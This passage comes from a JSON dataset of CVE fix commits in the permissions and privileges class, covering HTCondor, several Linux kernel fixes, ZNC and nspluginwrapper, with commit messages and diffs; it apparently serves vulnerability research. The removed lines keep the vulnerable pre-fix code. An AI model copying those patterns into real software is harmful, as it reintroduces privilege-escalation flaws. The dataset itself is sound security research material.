FALSE;\n-\t}\n-\n-\tif ( nToRemove > 0 ) {\n-\t\t\/\/ We are being told how many and which jobs to abort\n-\n-\t\tdprintf(D_FULLDEBUG,\"abort_job: asked to abort %d jobs\\n\",nToRemove);\n-\n-\t\twhile ( nToRemove > 0 ) {\n-\t\t\tif( !s->code(job_id) ) {\n-\t\t\t\tdprintf( D_ALWAYS, \"abort_job() can't read job_id #%d\\n\",\n-\t\t\t\t\tnToRemove);\n-\t\t\t\treturn FALSE;\n-\t\t\t}\n-\t\t\tabort_job_myself(job_id, JA_REMOVE_JOBS, false, true );\n-\t\t\tnToRemove--;\n-\t\t}\n-\t\ts->end_of_message();\n-\t} else {\n-\t\t\/\/ We are being told to scan the queue ourselves and abort\n-\t\t\/\/ any jobs which have a status = REMOVED or HELD\n-\t\tClassAd *job_ad;\n-\t\tstatic bool already_removing = false;\t\/\/ must be static!!!\n-\t\tchar constraint[120];\n-\n-\t\t\/\/ This could take a long time if the queue is large; do the\n-\t\t\/\/ end_of_message first so condor_rm does not timeout. We do not\n-\t\t\/\/ need any more info off of the socket anyway.\n-\t\ts->end_of_message();\n-\n-\t\tdprintf(D_FULLDEBUG,\"abort_job: asked to abort all status REMOVED\/HELD jobs\\n\");\n-\n-\t\t\/\/ if already_removing is true, it means the user sent a second condor_rm\n-\t\t\/\/ command before the first condor_rm command completed, and we are\n-\t\t\/\/ already in the below job scan\/removal loop in a different stack frame.\n-\t\t\/\/ so we should just return here.\n-\t\tif ( already_removing ) {\n-\t\t\treturn TRUE;\n-\t\t}\n-\n-\t\tsnprintf(constraint,120,\"%s == %d || %s == %d\",ATTR_JOB_STATUS,REMOVED,\n-\t\t\t\t ATTR_JOB_STATUS,HELD);\n-\n-\t\tjob_ad = GetNextJobByConstraint(constraint,1);\n-\t\tif ( job_ad ) {\n-\t\t\talready_removing = true;\n-\t\t}\n-\t\twhile ( job_ad ) {\n-\t\t\tif ( (job_ad->LookupInteger(ATTR_CLUSTER_ID,job_id.cluster) == 1) &&\n-\t\t\t\t (job_ad->LookupInteger(ATTR_PROC_ID,job_id.proc) == 1) ) {\n-\n-\t\t\t\t abort_job_myself(job_id, JA_REMOVE_JOBS, false, true );\n-\n-\t\t\t}\n-\t\t\tFreeJobAd(job_ad);\n-\n-\t\t\tjob_ad = GetNextJobByConstraint(constraint,0);\n-\t\t}\n-\t\talready_removing = false;\n-\t}\n-\n-\treturn TRUE;\n-}\n-\n-int\n Scheduler::transferJobFilesReaper(int tid,int exit_status)\n {\n \tExtArray<PROC_ID> *jobs;\n@@ -10324,9 +10251,6 @@ Scheduler::Register()\n \t daemonCore->Register_Command( RESCHEDULE, \"RESCHEDULE\", \n \t\t\t(CommandHandlercpp)&Scheduler::reschedule_negotiator, \n \t\t\t\"reschedule_negotiator\", this, WRITE);\n-\t daemonCore->Register_Command(KILL_FRGN_JOB, \"KILL_FRGN_JOB\", \n-\t\t\t(CommandHandlercpp)&Scheduler::abort_job, \n-\t\t\t\"abort_job\", this, WRITE);\n \t daemonCore->Register_Command(ACT_ON_JOBS, \"ACT_ON_JOBS\", \n \t\t\t(CommandHandlercpp)&Scheduler::actOnJobs, \n \t\t\t\"actOnJobs\", this, WRITE, D_COMMAND,\ndiff --git a\/src\/condor_schedd.V6\/scheduler.h b\/src\/condor_schedd.V6\/scheduler.h\nindex a1297a0..6b843f7 100644\n--- a\/src\/condor_schedd.V6\/scheduler.h\n+++ b\/src\/condor_schedd.V6\/scheduler.h\n@@ -291,8 +291,6 @@ class Scheduler : public Service\n \t\t\/\/ requires a new round of negotiation\n \tvoid            needReschedule();\n \n-\t\/\/ job managing\n-\tint\t\t\t\tabort_job(int, Stream *);\n \tvoid\t\t\tsend_all_jobs(ReliSock*, struct sockaddr_in*);\n \tvoid\t\t\tsend_all_jobs_prioritized(ReliSock*, struct sockaddr_in*);\n \tfriend\tint\t\tcount(ClassAd *);\n-- \n1.7.12.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-4127","CWE_ID":"264","category":"security","commit_id":"ec8013beddd717d1740cfefb1a9b900deef85462","commit_message":"From ec8013beddd717d1740cfefb1a9b900deef85462 Mon Sep 17 00:00:00 2001\nFrom: Paolo Bonzini <pbonzini@redhat.com>\nDate: Thu, 12 Jan 2012 16:01:29 +0100\nSubject: dm: do not forward ioctls from logical volumes to the underlying\n device\n\nA logical volume can map to just part of underlying physical volume.\nIn this case, it must be treated like a partition.\n\nBased on a patch from Alasdair G Kergon.\n\nCc: Alasdair G Kergon <agk@redhat.com>\nCc: dm-devel@redhat.com\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n drivers\/md\/dm-flakey.c | 11 ++++++++++-\n drivers\/md\/dm-linear.c | 12 +++++++++++-\n drivers\/md\/dm-mpath.c  |  6 ++++++\n 3 files changed, 27 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/md\/dm-flakey.c b\/drivers\/md\/dm-flakey.c\nindex f84c08029b21..9fb18c147825 100644\n--- a\/drivers\/md\/dm-flakey.c\n+++ b\/drivers\/md\/dm-flakey.c\n@@ -368,8 +368,17 @@ static int flakey_status(struct dm_target *ti, status_type_t type,\n static int flakey_ioctl(struct dm_target *ti, unsigned int cmd, unsigned long arg)\n {\n \tstruct flakey_c *fc = ti->private;\n+\tstruct dm_dev *dev = fc->dev;\n+\tint r = 0;\n \n-\treturn __blkdev_driver_ioctl(fc->dev->bdev, fc->dev->mode, cmd, arg);\n+\t\/*\n+\t * Only pass ioctls through if the device sizes match exactly.\n+\t *\/\n+\tif (fc->start ||\n+\t    ti->len != i_size_read(dev->bdev->bd_inode) >> SECTOR_SHIFT)\n+\t\tr = scsi_verify_blk_ioctl(NULL, cmd);\n+\n+\treturn r ? : __blkdev_driver_ioctl(dev->bdev, dev->mode, cmd, arg);\n }\n \n static int flakey_merge(struct dm_target *ti, struct bvec_merge_data *bvm,\ndiff --git a\/drivers\/md\/dm-linear.c b\/drivers\/md\/dm-linear.c\nindex 3921e3bb43c1..9728839f844a 100644\n--- a\/drivers\/md\/dm-linear.c\n+++ b\/drivers\/md\/dm-linear.c\n@@ -116,7 +116,17 @@ static int linear_ioctl(struct dm_target *ti, unsigned int cmd,\n \t\t\tunsigned long arg)\n {\n \tstruct linear_c *lc = (struct linear_c *) ti->private;\n-\treturn __blkdev_driver_ioctl(lc->dev->bdev, lc->dev->mode, cmd, arg);\n+\tstruct dm_dev *dev = lc->dev;\n+\tint r = 0;\n+\n+\t\/*\n+\t * Only pass ioctls through if the device sizes match exactly.\n+\t *\/\n+\tif (lc->start ||\n+\t    ti->len != i_size_read(dev->bdev->bd_inode) >> SECTOR_SHIFT)\n+\t\tr = scsi_verify_blk_ioctl(NULL, cmd);\n+\n+\treturn r ? : __blkdev_driver_ioctl(dev->bdev, dev->mode, cmd, arg);\n }\n \n static int linear_merge(struct dm_target *ti, struct bvec_merge_data *bvm,\ndiff --git a\/drivers\/md\/dm-mpath.c b\/drivers\/md\/dm-mpath.c\nindex 5e0090ef4182..801d92d237cf 100644\n--- a\/drivers\/md\/dm-mpath.c\n+++ b\/drivers\/md\/dm-mpath.c\n@@ -1520,6 +1520,12 @@ static int multipath_ioctl(struct dm_target *ti, unsigned int cmd,\n \n \tspin_unlock_irqrestore(&m->lock, flags);\n \n+\t\/*\n+\t * Only pass ioctls through if the device sizes match exactly.\n+\t *\/\n+\tif (!r && ti->len != i_size_read(bdev->bd_inode) >> SECTOR_SHIFT)\n+\t\tr = scsi_verify_blk_ioctl(NULL, cmd);\n+\n \treturn r ? : __blkdev_driver_ioctl(bdev, mode, cmd, arg);\n }\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2019-12816","CWE_ID":"264","category":"security","commit_id":"8de9e376ce531fe7f3c8b0aa4876d15b479b7311","commit_message":"From 8de9e376ce531fe7f3c8b0aa4876d15b479b7311 Mon Sep 17 00:00:00 2001\nFrom: Alexey Sokolov <alexey+znc@asokolov.org>\nDate: Wed, 12 Jun 2019 08:57:29 +0100\nSubject: [PATCH] Fix remote code execution and privilege escalation\n vulnerability.\n\nTo trigger this, need to have a user already.\n\nThanks for Jeriko One <jeriko.one@gmx.us> for finding and reporting this.\n\nCVE-2019-12816\n---\n include\/znc\/Modules.h |  1 +\n src\/Modules.cpp       | 38 +++++++++++++++++++++++++++++---------\n 2 files changed, 30 insertions(+), 9 deletions(-)\n\n","diff_code":"diff --git a\/include\/znc\/Modules.h b\/include\/znc\/Modules.h\nindex 28fdd3a62..db8f87b81 100644\n--- a\/include\/znc\/Modules.h\n+++ b\/include\/znc\/Modules.h\n@@ -1600,6 +1600,7 @@ class CModules : public std::vector<CModule*>, private CCoreTranslationMixin {\n   private:\n     static ModHandle OpenModule(const CString& sModule, const CString& sModPath,\n                                 CModInfo& Info, CString& sRetMsg);\n+    static bool ValidateModuleName(const CString& sModule, CString& sRetMsg);\n \n   protected:\n     CUser* m_pUser;\ndiff --git a\/src\/Modules.cpp b\/src\/Modules.cpp\nindex 5aec7805a..d41951a8d 100644\n--- a\/src\/Modules.cpp\n+++ b\/src\/Modules.cpp\n@@ -1624,11 +1624,30 @@ CModule* CModules::FindModule(const CString& sModule) const {\n     return nullptr;\n }\n \n+bool CModules::ValidateModuleName(const CString& sModule, CString& sRetMsg) {\n+    for (unsigned int a = 0; a < sModule.length(); a++) {\n+        if (((sModule[a] < '0') || (sModule[a] > '9')) &&\n+            ((sModule[a] < 'a') || (sModule[a] > 'z')) &&\n+            ((sModule[a] < 'A') || (sModule[a] > 'Z')) && (sModule[a] != '_')) {\n+            sRetMsg =\n+                t_f(\"Module names can only contain letters, numbers and \"\n+                    \"underscores, [{1}] is invalid\")(sModule);\n+            return false;\n+        }\n+    }\n+\n+    return true;\n+}\n+\n bool CModules::LoadModule(const CString& sModule, const CString& sArgs,\n                           CModInfo::EModuleType eType, CUser* pUser,\n                           CIRCNetwork* pNetwork, CString& sRetMsg) {\n     sRetMsg = \"\";\n \n+    if (!ValidateModuleName(sModule, sRetMsg)) {\n+        return false;\n+    }\n+\n     if (FindModule(sModule) != nullptr) {\n         sRetMsg = t_f(\"Module {1} already loaded.\")(sModule);\n         return false;\n@@ -1781,6 +1800,10 @@ bool CModules::ReloadModule(const CString& sModule, const CString& sArgs,\n \n bool CModules::GetModInfo(CModInfo& ModInfo, const CString& sModule,\n                           CString& sRetMsg) {\n+    if (!ValidateModuleName(sModule, sRetMsg)) {\n+        return false;\n+    }\n+\n     CString sModPath, sTmp;\n \n     bool bSuccess;\n@@ -1799,6 +1822,10 @@ bool CModules::GetModInfo(CModInfo& ModInfo, const CString& sModule,\n \n bool CModules::GetModPathInfo(CModInfo& ModInfo, const CString& sModule,\n                               const CString& sModPath, CString& sRetMsg) {\n+    if (!ValidateModuleName(sModule, sRetMsg)) {\n+        return false;\n+    }\n+\n     ModInfo.SetName(sModule);\n     ModInfo.SetPath(sModPath);\n \n@@ -1911,15 +1938,8 @@ ModHandle CModules::OpenModule(const CString& sModule, const CString& sModPath,\n     \/\/ Some sane defaults in case anything errors out below\n     sRetMsg.clear();\n \n-    for (unsigned int a = 0; a < sModule.length(); a++) {\n-        if (((sModule[a] < '0') || (sModule[a] > '9')) &&\n-            ((sModule[a] < 'a') || (sModule[a] > 'z')) &&\n-            ((sModule[a] < 'A') || (sModule[a] > 'Z')) && (sModule[a] != '_')) {\n-            sRetMsg =\n-                t_f(\"Module names can only contain letters, numbers and \"\n-                    \"underscores, [{1}] is invalid\")(sModule);\n-            return nullptr;\n-        }\n+    if (!ValidateModuleName(sModule, sRetMsg)) {\n+        return nullptr;\n     }\n \n     \/\/ The second argument to dlopen() has a long history. It seems clear\n","owner":"znc","repo":"znc","source":"cve"},{"CVE_ID":"CVE-2009-1338","CWE_ID":"264","category":"security","commit_id":"d25141a818383b3c3b09f065698c544a7a0ec6e7","commit_message":"From d25141a818383b3c3b09f065698c544a7a0ec6e7 Mon Sep 17 00:00:00 2001\nFrom: Sukadev Bhattiprolu <sukadev@linux.vnet.ibm.com>\nDate: Wed, 29 Oct 2008 14:01:11 -0700\nSubject: 'kill sig -1' must only apply to caller's namespace\n\nCurrently \"kill <sig> -1\" kills processes in all namespaces and breaks the\nisolation of namespaces.  Earlier attempt to fix this was discussed at:\n\n\thttp:\/\/lkml.org\/lkml\/2008\/7\/23\/148\n\nAs suggested by Oleg Nesterov in that thread, use \"task_pid_vnr() > 1\"\ncheck since task_pid_vnr() returns 0 if process is outside the caller's\nnamespace.\n\nSigned-off-by: Sukadev Bhattiprolu <sukadev@linux.vnet.ibm.com>\nAcked-by: Eric W. Biederman <ebiederm@xmission.com>\nTested-by: Daniel Hokka Zakrisson <daniel@hozac.com>\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/signal.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/kernel\/signal.c b\/kernel\/signal.c\nindex 105217da5c82..4530fc654455 100644\n--- a\/kernel\/signal.c\n+++ b\/kernel\/signal.c\n@@ -1144,7 +1144,8 @@ static int kill_something_info(int sig, struct siginfo *info, pid_t pid)\n \t\tstruct task_struct * p;\n \n \t\tfor_each_process(p) {\n-\t\t\tif (p->pid > 1 && !same_thread_group(p, current)) {\n+\t\t\tif (task_pid_vnr(p) > 1 &&\n+\t\t\t\t\t!same_thread_group(p, current)) {\n \t\t\t\tint err = group_send_sig_info(sig, info, p);\n \t\t\t\t++count;\n \t\t\t\tif (err != -EPERM)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-9922","CWE_ID":"264","category":"security","commit_id":"69c433ed2ecd2d3264efd7afec4439524b319121","commit_message":"From 69c433ed2ecd2d3264efd7afec4439524b319121 Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <mszeredi@suse.cz>\nDate: Fri, 24 Oct 2014 00:14:39 +0200\nSubject: fs: limit filesystem stacking depth\n\nAdd a simple read-only counter to super_block that indicates how deep this\nis in the stack of filesystems.  Previously ecryptfs was the only stackable\nfilesystem and it explicitly disallowed multiple layers of itself.\n\nOverlayfs, however, can be stacked recursively and also may be stacked\non top of ecryptfs or vice versa.\n\nTo limit the kernel stack usage we must limit the depth of the\nfilesystem stack.  Initially the limit is set to 2.\n\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz>\n---\n fs\/ecryptfs\/main.c   |  7 +++++++\n fs\/overlayfs\/super.c |  9 +++++++++\n include\/linux\/fs.h   | 11 +++++++++++\n 3 files changed, 27 insertions(+)\n\n","diff_code":"diff --git a\/fs\/ecryptfs\/main.c b\/fs\/ecryptfs\/main.c\nindex 1b119d3bf924..c4cd1fd86cc2 100644\n--- a\/fs\/ecryptfs\/main.c\n+++ b\/fs\/ecryptfs\/main.c\n@@ -566,6 +566,13 @@ static struct dentry *ecryptfs_mount(struct file_system_type *fs_type, int flags\n \ts->s_maxbytes = path.dentry->d_sb->s_maxbytes;\n \ts->s_blocksize = path.dentry->d_sb->s_blocksize;\n \ts->s_magic = ECRYPTFS_SUPER_MAGIC;\n+\ts->s_stack_depth = path.dentry->d_sb->s_stack_depth + 1;\n+\n+\trc = -EINVAL;\n+\tif (s->s_stack_depth > FILESYSTEM_MAX_STACK_DEPTH) {\n+\t\tpr_err(\"eCryptfs: maximum fs stacking depth exceeded\\n\");\n+\t\tgoto out_free;\n+\t}\n \n \tinode = ecryptfs_get_inode(path.dentry->d_inode, s);\n \trc = PTR_ERR(inode);\ndiff --git a\/fs\/overlayfs\/super.c b\/fs\/overlayfs\/super.c\nindex 7dcc24e84417..08b704cebfc4 100644\n--- a\/fs\/overlayfs\/super.c\n+++ b\/fs\/overlayfs\/super.c\n@@ -677,6 +677,15 @@ static int ovl_fill_super(struct super_block *sb, void *data, int silent)\n \t}\n \tufs->lower_namelen = statfs.f_namelen;\n \n+\tsb->s_stack_depth = max(upperpath.mnt->mnt_sb->s_stack_depth,\n+\t\t\t\tlowerpath.mnt->mnt_sb->s_stack_depth) + 1;\n+\n+\terr = -EINVAL;\n+\tif (sb->s_stack_depth > FILESYSTEM_MAX_STACK_DEPTH) {\n+\t\tpr_err(\"overlayfs: maximum fs stacking depth exceeded\\n\");\n+\t\tgoto out_put_workpath;\n+\t}\n+\n \tufs->upper_mnt = clone_private_mount(&upperpath);\n \terr = PTR_ERR(ufs->upper_mnt);\n \tif (IS_ERR(ufs->upper_mnt)) {\ndiff --git a\/include\/linux\/fs.h b\/include\/linux\/fs.h\nindex 69118b3cb917..4e41a4a331bb 100644\n--- a\/include\/linux\/fs.h\n+++ b\/include\/linux\/fs.h\n@@ -261,6 +261,12 @@ struct iattr {\n  *\/\n #include <linux\/quota.h>\n \n+\/*\n+ * Maximum number of layers of fs stack.  Needs to be limited to\n+ * prevent kernel stack overflow\n+ *\/\n+#define FILESYSTEM_MAX_STACK_DEPTH 2\n+\n \/** \n  * enum positive_aop_returns - aop return codes with specific semantics\n  *\n@@ -1273,6 +1279,11 @@ struct super_block {\n \tstruct list_lru\t\ts_dentry_lru ____cacheline_aligned_in_smp;\n \tstruct list_lru\t\ts_inode_lru ____cacheline_aligned_in_smp;\n \tstruct rcu_head\t\trcu;\n+\n+\t\/*\n+\t * Indicates how deep in a filesystem stack this SB is\n+\t *\/\n+\tint s_stack_depth;\n };\n \n extern struct timespec current_fs_time(struct super_block *sb);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-2486","CWE_ID":"264","category":"security","commit_id":"7e4ab8e1189846041f955e6c83f72bc1624e7a98","commit_message":"From 7e4ab8e1189846041f955e6c83f72bc1624e7a98 Mon Sep 17 00:00:00 2001\nFrom: David Benjamin <davidben@mit.edu>\nDate: Fri, 25 Mar 2011 18:52:42 -0400\nSubject: [PATCH] Support all the new variables added\n\n---\n src\/npw-rpc.c    | 7 +++++++\n src\/npw-viewer.c | 2 ++\n src\/utils.c      | 7 +++++++\n 3 files changed, 16 insertions(+)\n\n","diff_code":"diff --git a\/src\/npw-rpc.c b\/src\/npw-rpc.c\nindex 569aa0c..ecb99a4 100644\n--- a\/src\/npw-rpc.c\n+++ b\/src\/npw-rpc.c\n@@ -41,6 +41,8 @@ int rpc_type_of_NPNVariable(int variable)\n   case NPNVisOfflineBool:\n   case NPNVSupportsXEmbedBool:\n   case NPNVSupportsWindowless:\n+  case NPNVprivateModeBool:\n+  case NPNVsupportsAdvancedKeyHandling:\n \ttype = RPC_TYPE_BOOLEAN;\n \tbreak;\n   case NPNVToolkit:\n@@ -65,6 +67,7 @@ int rpc_type_of_NPPVariable(int variable)\n   case NPPVpluginNameString:\n   case NPPVpluginDescriptionString:\n   case NPPVformValue: \/\/ byte values of 0 does not appear in the UTF-8 encoding but for U+0000\n+  case NPPVpluginNativeAccessibleAtkPlugId:\n \ttype = RPC_TYPE_STRING;\n \tbreak;\n   case NPPVpluginWindowSize:\n@@ -76,6 +79,10 @@ int rpc_type_of_NPPVariable(int variable)\n   case NPPVpluginTransparentBool:\n   case NPPVjavascriptPushCallerBool:\n   case NPPVpluginKeepLibraryInMemory:\n+  case NPPVpluginUrlRequestsDisplayedBool:\n+  case NPPVpluginWantsAllNetworkStreams:\n+  case NPPVpluginCancelSrcStream:\n+  case NPPVSupportsAdvancedKeyHandling:\n \ttype = RPC_TYPE_BOOLEAN;\n \tbreak;\n   case NPPVpluginScriptableNPObject:\ndiff --git a\/src\/npw-viewer.c b\/src\/npw-viewer.c\nindex 384b9a7..c37813c 100644\n--- a\/src\/npw-viewer.c\n+++ b\/src\/npw-viewer.c\n@@ -1302,6 +1302,8 @@ g_NPN_GetValue(NPP instance, NPNVariable variable, void *value)\n   case NPNVSupportsXEmbedBool:\n   case NPNVWindowNPObject:\n   case NPNVPluginElementNPObject:\n+  case NPNVprivateModeBool:\n+  case NPNVsupportsAdvancedKeyHandling:\n \treturn g_NPN_GetValue_real(instance, variable, value);\n   default:\n \tswitch (variable & 0xff) {\ndiff --git a\/src\/utils.c b\/src\/utils.c\nindex 842b1e9..f87a29d 100644\n--- a\/src\/utils.c\n+++ b\/src\/utils.c\n@@ -247,6 +247,11 @@ const char *string_of_NPPVariable(int variable)\n \t_(NPPVpluginNeedsXEmbed);\n \t_(NPPVpluginScriptableNPObject);\n \t_(NPPVformValue);\n+\t_(NPPVpluginUrlRequestsDisplayedBool);\n+\t_(NPPVpluginWantsAllNetworkStreams);\n+\t_(NPPVpluginNativeAccessibleAtkPlugId);\n+\t_(NPPVpluginCancelSrcStream);\n+\t_(NPPVSupportsAdvancedKeyHandling);\n #undef _\n   default:\n \tswitch (variable & 0xff) {\n@@ -283,6 +288,8 @@ const char *string_of_NPNVariable(int variable)\n \t_(NPNVWindowNPObject);\n \t_(NPNVPluginElementNPObject);\n \t_(NPNVSupportsWindowless);\n+\t_(NPNVprivateModeBool);\n+\t_(NPNVsupportsAdvancedKeyHandling);\n #undef _\n   default:\n \tswitch (variable & 0xff) {\n","owner":"davidben","repo":"nspluginwrapper","source":"cve"},{"CVE_ID":"CVE-2016-3699","CWE_ID":"264","category":"security","commit_id":"a4a5ed2835e8ea042868b7401dced3f517cafa76","commit_message":"From a4a5ed2835e8ea042868b7401dced3f517cafa76 Mon Sep 17 00:00:00 2001\nFrom: Linn Crosetto <linn@hpe.com>\nDate: Fri, 4 Mar 2016 16:08:24 -0700\nSubject: [PATCH] acpi: Disable ACPI table override if securelevel is set\n\nFrom the kernel documentation (initrd_table_override.txt):\n\n  If the ACPI_INITRD_TABLE_OVERRIDE compile option is true, it is possible\n  to override nearly any ACPI table provided by the BIOS with an\n  instrumented, modified one.\n\nWhen securelevel is set, the kernel should disallow any unauthenticated\nchanges to kernel space. ACPI tables contain code invoked by the kernel, so\ndo not allow ACPI tables to be overridden if securelevel is set.\n\nSigned-off-by: Linn Crosetto <linn@hpe.com>\n---\n arch\/x86\/kernel\/setup.c | 12 ++++++------\n drivers\/acpi\/osl.c      |  6 ++++++\n 2 files changed, 12 insertions(+), 6 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kernel\/setup.c b\/arch\/x86\/kernel\/setup.c\nindex 4b004415d3dc8..75143139a95cf 100644\n--- a\/arch\/x86\/kernel\/setup.c\n+++ b\/arch\/x86\/kernel\/setup.c\n@@ -1137,6 +1137,12 @@ void __init setup_arch(char **cmdline_p)\n \t\/* Allocate bigger log buffer *\/\n \tsetup_log_buf(1);\n \n+#ifdef CONFIG_EFI_SECURE_BOOT_SECURELEVEL\n+\tif (boot_params.secure_boot) {\n+\t\tset_securelevel(1);\n+\t}\n+#endif\n+\n \treserve_initrd();\n \n #if defined(CONFIG_ACPI) && defined(CONFIG_BLK_DEV_INITRD)\n@@ -1147,12 +1153,6 @@ void __init setup_arch(char **cmdline_p)\n \n \tio_delay_init();\n \n-#ifdef CONFIG_EFI_SECURE_BOOT_SECURELEVEL\n-\tif (boot_params.secure_boot) {\n-\t\tset_securelevel(1);\n-\t}\n-#endif\n-\n \t\/*\n \t * Parse the ACPI tables for possible boot-time SMP configuration.\n \t *\/\ndiff --git a\/drivers\/acpi\/osl.c b\/drivers\/acpi\/osl.c\nindex 242ca81bb606f..45547418f186c 100644\n--- a\/drivers\/acpi\/osl.c\n+++ b\/drivers\/acpi\/osl.c\n@@ -707,6 +707,12 @@ void __init acpi_initrd_override(void *data, size_t size)\n \tif (table_nr == 0)\n \t\treturn;\n \n+\tif (get_securelevel() > 0) {\n+\t\tpr_notice(PREFIX\n+\t\t\t\"securelevel enabled, ignoring table override\\n\");\n+\t\treturn;\n+\t}\n+\n \tacpi_tables_addr =\n \t\tmemblock_find_in_range(0, max_low_pfn_mapped << PAGE_SHIFT,\n \t\t\t\t       all_tables_size, PAGE_SIZE);\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-1019","CWE_ID":"264","category":"security","commit_id":"8909c9ad8ff03611c9c96c9a92656213e4bb495b","commit_message":"From 8909c9ad8ff03611c9c96c9a92656213e4bb495b Mon Sep 17 00:00:00 2001\nFrom: Vasiliy Kulikov <segoon@openwall.com>\nDate: Wed, 2 Mar 2011 00:33:13 +0300\nSubject: [PATCH] net: don't allow CAP_NET_ADMIN to load non-netdev kernel\n modules\n\nSince a8f80e8ff94ecba629542d9b4b5f5a8ee3eb565c any process with\nCAP_NET_ADMIN may load any module from \/lib\/modules\/.  This doesn't mean\nthat CAP_NET_ADMIN is a superset of CAP_SYS_MODULE as modules are\nlimited to \/lib\/modules\/**.  However, CAP_NET_ADMIN capability shouldn't\nallow anybody load any module not related to networking.\n\nThis patch restricts an ability of autoloading modules to netdev modules\nwith explicit aliases.  This fixes CVE-2011-1019.\n\nArnd Bergmann suggested to leave untouched the old pre-v2.6.32 behavior\nof loading netdev modules by name (without any prefix) for processes\nwith CAP_SYS_MODULE to maintain the compatibility with network scripts\nthat use autoloading netdev modules by aliases like \"eth0\", \"wlan0\".\n\nCurrently there are only three users of the feature in the upstream\nkernel: ipip, ip_gre and sit.\n\n    root@albatros:~# capsh --drop=$(seq -s, 0 11),$(seq -s, 13 34) --\n    root@albatros:~# grep Cap \/proc\/$$\/status\n    CapInh:\t0000000000000000\n    CapPrm:\tfffffff800001000\n    CapEff:\tfffffff800001000\n    CapBnd:\tfffffff800001000\n    root@albatros:~# modprobe xfs\n    FATAL: Error inserting xfs\n    (\/lib\/modules\/2.6.38-rc6-00001-g2bf4ca3\/kernel\/fs\/xfs\/xfs.ko): Operation not permitted\n    root@albatros:~# lsmod | grep xfs\n    root@albatros:~# ifconfig xfs\n    xfs: error fetching interface information: Device not found\n    root@albatros:~# lsmod | grep xfs\n    root@albatros:~# lsmod | grep sit\n    root@albatros:~# ifconfig sit\n    sit: error fetching interface information: Device not found\n    root@albatros:~# lsmod | grep sit\n    root@albatros:~# ifconfig sit0\n    sit0      Link encap:IPv6-in-IPv4\n\t      NOARP  MTU:1480  Metric:1\n\n    root@albatros:~# lsmod | grep sit\n    sit                    10457  0\n    tunnel4                 2957  1 sit\n\nFor CAP_SYS_MODULE module loading is still relaxed:\n\n    root@albatros:~# grep Cap \/proc\/$$\/status\n    CapInh:\t0000000000000000\n    CapPrm:\tffffffffffffffff\n    CapEff:\tffffffffffffffff\n    CapBnd:\tffffffffffffffff\n    root@albatros:~# ifconfig xfs\n    xfs: error fetching interface information: Device not found\n    root@albatros:~# lsmod | grep xfs\n    xfs                   745319  0\n\nReference: https:\/\/lkml.org\/lkml\/2011\/2\/24\/203\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Michael Tokarev <mjt@tls.msk.ru>\nAcked-by: David S. Miller <davem@davemloft.net>\nAcked-by: Kees Cook <kees.cook@canonical.com>\nSigned-off-by: James Morris <jmorris@namei.org>\n---\n include\/linux\/netdevice.h |  3 +++\n net\/core\/dev.c            | 12 ++++++++++--\n net\/ipv4\/ip_gre.c         |  2 +-\n net\/ipv4\/ipip.c           |  2 +-\n net\/ipv6\/sit.c            |  2 +-\n 5 files changed, 16 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/netdevice.h b\/include\/linux\/netdevice.h\nindex d971346b0340d..71caf7a5e6c6c 100644\n--- a\/include\/linux\/netdevice.h\n+++ b\/include\/linux\/netdevice.h\n@@ -2392,6 +2392,9 @@ extern int netdev_notice(const struct net_device *dev, const char *format, ...)\n extern int netdev_info(const struct net_device *dev, const char *format, ...)\n \t__attribute__ ((format (printf, 2, 3)));\n \n+#define MODULE_ALIAS_NETDEV(device) \\\n+\tMODULE_ALIAS(\"netdev-\" device)\n+\n #if defined(DEBUG)\n #define netdev_dbg(__dev, format, args...)\t\t\t\\\n \tnetdev_printk(KERN_DEBUG, __dev, format, ##args)\ndiff --git a\/net\/core\/dev.c b\/net\/core\/dev.c\nindex 8ae6631abcc20..6561021d22d1f 100644\n--- a\/net\/core\/dev.c\n+++ b\/net\/core\/dev.c\n@@ -1114,13 +1114,21 @@ EXPORT_SYMBOL(netdev_bonding_change);\n void dev_load(struct net *net, const char *name)\n {\n \tstruct net_device *dev;\n+\tint no_module;\n \n \trcu_read_lock();\n \tdev = dev_get_by_name_rcu(net, name);\n \trcu_read_unlock();\n \n-\tif (!dev && capable(CAP_NET_ADMIN))\n-\t\trequest_module(\"%s\", name);\n+\tno_module = !dev;\n+\tif (no_module && capable(CAP_NET_ADMIN))\n+\t\tno_module = request_module(\"netdev-%s\", name);\n+\tif (no_module && capable(CAP_SYS_MODULE)) {\n+\t\tif (!request_module(\"%s\", name))\n+\t\t\tpr_err(\"Loading kernel module for a network device \"\n+\"with CAP_SYS_MODULE (deprecated).  Use CAP_NET_ADMIN and alias netdev-%s \"\n+\"instead\\n\", name);\n+\t}\n }\n EXPORT_SYMBOL(dev_load);\n \ndiff --git a\/net\/ipv4\/ip_gre.c b\/net\/ipv4\/ip_gre.c\nindex 6613edfac28c1..d1d0e2c256fc4 100644\n--- a\/net\/ipv4\/ip_gre.c\n+++ b\/net\/ipv4\/ip_gre.c\n@@ -1765,4 +1765,4 @@ module_exit(ipgre_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_ALIAS_RTNL_LINK(\"gre\");\n MODULE_ALIAS_RTNL_LINK(\"gretap\");\n-MODULE_ALIAS(\"gre0\");\n+MODULE_ALIAS_NETDEV(\"gre0\");\ndiff --git a\/net\/ipv4\/ipip.c 